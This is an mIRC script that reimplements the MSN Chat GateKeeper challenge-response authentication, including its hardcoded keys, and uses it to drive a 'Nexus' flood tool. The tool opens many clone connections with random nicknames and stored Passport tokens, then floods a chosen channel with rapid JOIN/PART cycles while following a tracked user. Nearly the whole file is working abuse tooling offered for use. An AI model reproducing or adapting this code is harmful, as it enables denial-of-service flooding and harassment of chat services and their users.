;;;CORE CODE;;;
Challenge Header - by Sky
Challenge Lib v2.0
zmic converted the MSNChat OCX to ASM and decyphered the authentication. We owe all this to him.

Instruction Set
gkssp_form(FF00FF00FF00FF00FF00FF00FF00FF00) - 16 Hex
__tobin(STRING)
__unpack(INT)
__toescbin(:GKSSP\0???\0\0\0?\0\0\0????????) - 32byte word
__tochr(ASCII CHAR)
__hexbin(FF00FF00FF00FF00FF00FF00FF00FF00,OPTIONAL VAL) - 16 Hex (optional with escape filtering)
challenge_1(:GKSSP\0???\0\0\0?\0\0\0????????) - 32byte word

Start Code

alias gkssp_form {
  var %output,%hex,%x = $1,%i = 1
  ;seq=7,5,3,1,11,9,15,13,17
  if ($len($1) < 32) { %x = $+($str(0,$calc(32 - $len($ifmatch)),$ifmatch) }
  %x = $mid(%x,7,2) $+ $mid(%x,5,2) $+ $mid(%x,3,2) $+ $mid(%x,1,2) $+ $mid(%x,11,2) $+ $mid(%x,9,2) $+ $mid(%x,15,2) $+ $mid(%x,13,2) $+ $right(%x,-16)
  return $__tochr($__hexbin(%x,NULL))
}

alias __tobin {
  var %o,%i = 1
  while (%i <= $len($1-)) {
    %o = %o $asc($mid($1-,%i,1))
    inc %i
  }
  return %o
}

alias __unpack {
  if ($1 == 92) { return 92 }
  elseif ($1 == 98) { return 32 }
  elseif ($1 == 116) { return 9 }
  elseif ($1 == 114) { return 13 }
  elseif ($1 == 110) { return 10 }
  elseif ($1 == 99) { return 44 }
  elseif ($1 == 48) { return 0 }
}

alias __toescbin {
  var %str = $right($1-,-8), %str = $__tobin($mid(%str,$calc($pos(%str,\0\0\0\0\0\0) + 13),$len(%str)))
  var %tok = $numtok(%str,32), %switch, %out, %i = 1
  while (%i <= %tok) {
    %switch = $gettok(%str,%i,32)
    if (%switch == 92) { inc %i | %switch = $gettok(%str,%i,32) | %out = %out $__unpack(%switch) }
    else { %out = %out %switch }
    inc %i
  }
  return %out
}

alias __tochr {
  var %o,%i = 1
  while (%i <= $numtok($1-,32)) {
    %o = %o $+ $chr($gettok($1-,%i,32))
    inc %i
  }
  return %o
}

alias __hexbin { 
  var %o,%i = 1,%hex,%switch
  if (!$2) {
    ;Excluding Escape Char
    while (%i <= $len($1)) {
      %o = %o $base($mid($1,%i,2),16,10)
      inc %i 2
    }
    return %o
  }
  else {
    ;Including Escaps Char (0=00,t=09,n=0A,r=0D,b=20,c=2C,\=5C)
    while (%i <= $len($1)) {
      %switch = $mid($1,%i,2)
      if (%switch == 00) { %o = %o 92 48 }
      elseif (%switch == 09) { %o = %o 92 116 } 
      elseif (%switch == 0A) { %o = %o 92 110 } 
      elseif (%switch == 0D) { %o = %o 92 114 } 
      elseif (%switch == 20) { %o = %o 92 98 } 
      elseif (%switch == 2C) { %o = %o 92 99 } 
      elseif (%switch == 5C) { %o = %o 92 92 } 
      else { %o = %o $base(%switch,16,10) }
      inc %i 2
    }
    return %o
  }
}

alias binary { 
  var %binary
  var %i = 1
  while (%i <= 16) {
    %binary = $+(%binary,$iif($rand(1,0) == 0,\0,$chr(1)))
    inc %i
  }
  return %binary
}

alias challenge_1 {
  var %challenge_1 = $__toescbin($1)
  bset &challenge 1 $__tobin($ckey_1) %challenge_1 $__tobin($2)
  bset &challenge_ 1 $__tobin($ckey_2) $__hexbin($md5(&challenge,1))
  %challenge_1 = $__tochr($__hexbin($md5(&challenge_,1),NULL))
  return %challenge_1
}

;MSN Challenge Keys
;Gabriel the archangel appeared to zmic one night, and revealed these strings

alias ckey_1 return $+(edp{}e|wxrdse}}u,$str(6,48))
alias ckey_2 return $+(,$chr(26),,$str(\,48))

;MSN Combinations
alias ircvers return IRCVERS IRC8 MSN-OCX
alias __GuestInit return $+(AUTH GateKeeper I :GKSSP\0\0\0,$chr(3),\0\0\0,$chr(1),\0\0\0)
alias __PassportInit return $+(AUTH GateKeeperPassport I :GKSSP\0\0\0,$chr(3),\0\0\0,$chr(1),\0\0\0)
alias __GKINIT return $+($__GuestInit,$lf,$ircvers,$lf)
alias __PPINIT return $+($__PassportInit,$lf,$ircvers,$lf)
alias __GKSSReply return $+(AUTH GateKeeper S :GKSSP\0\0\0,$chr(2),\0\0\0,$chr(3),\0\0\0)

alias passform return $base($len($$1),10,16,8) $+ $1 $+ $base($len($$2),10,16,8) $+ $2

alias r exit | run $mircexe
alias lookups {
  return 207.68.167.253
}
on *:start:{
  if (!%track) { echo -s Notice: There is no nickname being tracked for GOTO. Please set a nickname. }
  .timertitle -m 0 50 dotitle
  echo -a Notice: Setting up nexus starting point.
  sockopen lookups $lookups 6667
}
#goto on
#goto end
alias dotitle {
  var %x = Nexus Sockets: $sock(flood.*,0)
  if ($titlebar != %x) { titlebar %x }
}
menu status {
  New Flood:{ flood }
  Close Sockets:{ sockclose flood.* } 
  $iif($sock(flood*).status == active,-,$null)
  $iif($sock(flood*).status == active,Join,$null) $+ :{ joinall }
  $iif($sock(flood*).status == active,Part,$null) $+ :{ sockwrite -tn flood.* PART %join }
  $iif($sock(flood*).status == active,HopAll,$null) $+ :{ hopall }
  $iif($sock(flood*).status == active,HopTease,$null) $+ :{ hoptease }
  -
  Flush Variables:{ 
    var %tstore = %track
    var %gstore = %generation
    var %lstore = %length
    .remove remote.ini
    write remote.ini [variables]
    .load -rv remote.ini
    set %track %tstore
    set %generation %gstore
    set %length %lstore
    echo -s Notice: Variables Flushed. 
  }
  -
  Settings
  .Goto Nickname ( $+ $iif(%track,%track,None) $+ ) :{ set %track $$?"Please enter in a nickname" }
  .-
  . $+ $iif($group(#goto) == on,$style(1)) $+ Goto:{ $iif($group(#goto) == on,.disable #goto,.enable #goto) }
  . $+ $iif($group(#goto) == off,$style(1)) $+ Join:{ $iif($group(#goto) == on,.disable #goto,.enable #goto) }
  .-
  . $+ $iif($group(#AutoHop) == on,$style(1)) $+ Auto Hop:{ $iif($group(#AutoHop) == on,.disable #AutoHop,.enable #AutoHop) }
  Nickname Generation
  . $+ $iif(%generation == 1,$style(1)) $+ Lower ([a-z]):{ set %generation 1 }
  . $+ $iif(%generation == 2,$style(1)) $+ Lower/Upper ([a-z][A-Z]):{ set %generation 2 }
  . $+ $iif(%generation == 3,$style(1)) $+ Lower/Upper/Numeric ([a-z][A-Z][0-9]):{ set %generation 3 }
  . $+ $iif(%generation == 4,$style(1)) $+ MD5 Hash:{ set %generation 4 }
  .-
  .Length %length :{ set %length $?"Please enter in the nickname length MAX=175" }
}

#AutoHop off
#AutoHop end

alias hopall {
  if ($group(#goto) == on) {
    sockwrite -tn flood.* PART %join
    sockwrite -b flood.* 255 GOTO %join %track $lf
  }
  elseif ($group(#goto) != on) {
    sockwrite -tn flood.* PART %join
    sockwrite -tn flood.* JOIN %join
  }
}

alias hoptease {
  if ($group(#goto) == on) {
    var %x = $+(GOTO %join %track,$lf,PART %join,$lf,GOTO %join %track,$lf,PART %join,$lf,GOTO %join %track,$lf,PART %join,$lf,GOTO %join %track,$lf,PART %join,$lf,GOTO %join %track,$lf,PART %join,$lf)
    sockwrite flood.* %x
    ;    sockwrite flood.* %x
  }
  elseif ($group(#goto) != on) {
    var %x = $+(JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf)
    sockwrite flood.* %x
    ;    sockwrite flood.* %x
  }
}

alias joinall {
  if ($group(#goto) == on) {
    sockwrite -b flood.* 255 GOTO %join %track $lf
  }
  elseif ($group(#goto) != on) {
    sockwrite -tn flood.* JOIN %join
  }
}

on *:sockopen:lookups:{
  .timerkeepfinds $+ $sockname 0 15 keepfinds $sockname $sock($sockname).ip $sock($sockname).port $sock($sockname).mark
  sockwrite $sockname $+(NICK >Nexus,$lf,$__GKINIT)
}
alias keepfinds {
  if ($sock($1).status == active) {
    sockwrite -tn $1 VERSION
  }
  else {
    sockopen $1 $2 $3
    sockmark $1 $hget(Link,$1)
  }
}
on *:sockread:lookups:{
  sockread -n &read
  var %data = $bvar(&read,1,$bvar(&read,0)).text
  tokenize 32 %data 
  if (AUTH GateKeeper S == $1-3) && ($4 != :OK) { sockwrite $sockname $+($__GKSSREPLY,$challenge_1($4,$sock($sockname).ip),$binary,$crlf) }
  elseif ($1-3 == AUTH GateKeeper *) echo -a Notice: Nexus is now ready.
  elseif ($2 == 613) { setupflood $remove($4,:) | echo -s Notice: Found and attempting to flood. }
  elseif ($2 == 702) echo -s Notice: $right($4-,-1)
}
alias getsck return $+(flood.,$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z))

;alias getnick return $+($rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z),$rand(a,z))
;alias getnick return $md5($getsck) $+ $md5($getsck)
alias getnick {
  var %i = 1, %m = %length, %n, %gmax = %generation
  if (%m == $null) && (%gmax < 4) { %m = $rand(1,30) }
  elseif (%m == $null) && (%gmax = 4) { %m = 64 }

  if (%gmax = $null) { %gmax = 3 }
  if (%gmax == 4) { 
    while (%i <= %m) {
      %n = %n $+ $md5($getsck)
      if ($len(%n) > %m) { %n = $left(%n,%m) }
      inc %i
    }
  }
  else {
    while (%i <= %m) {
      var %x = $rand(1,%gmax)
      if (%x == 1) { %n = %n $+ $rand(a,z) }
      elseif (%x == 2) { %n = %n $+ $rand(A,Z) }
      elseif (%x == 3) { %n = %n $+ $rand(0,9) }
      inc %i
    }
  }
  return %n
}

alias nothing
alias flood {
  if (%pauth. [ $+ [ 1 ] ] == $null) halt $input(Please Massupdate.,$OK)
  set %join $$?"Please enter in the channel name."
  unset %flooda,%floodb
  set %flooda $$?"Please enter in the flood lower boundry"
  set %floodb $$?"Please enter in the flood upper boundry"
  if ($int(%flooda) <= 0) || ($int(%floodb) <= 0) { halt $input(Invalid Range,$ok) }
  .timertitle -m 0 50 dotitle
  sockwrite -tn lookups FINDS %join
}

alias setupflood {
  var %lbound = %flooda
  while (%flooda <= %floodb) {
    if (%pauth. [ $+ [ %flooda ] ] != $null) {
      var %x = $getsck
      if (%flooda == %lbound) { set %primsock %x }
      hadd -m nicks %x $getnick(%flooda)
      sockopen %x $$1 6667
      sockmark %x %flooda
    }
    inc %flooda
  }
}

on *:sockopen:flood.*:{
  if ($sockerr > 0) { echo -s Error: $sockname failed connecting. | halt }
  sockwrite $sockname $+(NICK $hget(nicks,$sockname),$lf,$__PPINIT)
}

on *:sockread:flood.*:{
  sockread -n &read
  var %data = $bvar(&read,1,$bvar(&read,0)).text
  tokenize 32 %data
  if (%primsock == $sockname) && ($1 != PING) echo -a 7FSOCK1 Sockread: $sockname $1-
  if ($2 == 473) { echo -a $sockname failed.(+i) }
  if (AUTH GateKeeperPassport S == $1-3) { 
    sockwrite $sockname $+($__GKSSREPLY,$challenge_1($4,$sock($sockname).ip),$lf)
  }
  elseif ($1-3 == AUTH GateKeeperPassport *) { 
    hadd -m $sockname ADDRESS $4
  }
  elseif ($1-4 == AUTH GateKeeper S :OK) {
    sockwrite $sockname $+(AUTH GateKeeperPassport S :,%pauth. [ $+ [ $sock($sockname).mark ] ],$lf,PROP $ SUBSCRIBERINFO :,%sinfo. [ $+ [ $sock($sockname).mark ] ],$lf,USER $hget(nicks,$sockname) * * :,$chr(32),$lf)
    if ($sock($sockname).mark == %floodb) { echo -s Notice: Flooders Setup. Ready? }
  }
  elseif ($1 == PING) { sockwrite -tn $sockname PONG $2- }

  if ($group(#AutoHop) == on) {
    if ($2 == JOIN) && ($gettok($1,2,33) == $hget($sockname,ADDRESS)) {
      sockwrite $sockname $+(PART %join,$lf,JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf)
    }
    elseif ($2 == PART) && ($gettok($1,2,33) == $hget($sockname,ADDRESS)) {
      sockwrite $sockname $+(JOIN %join,$lf,PART %join,$lf,JOIN %join,$lf,PART %join,$lf)
    }
  }
}
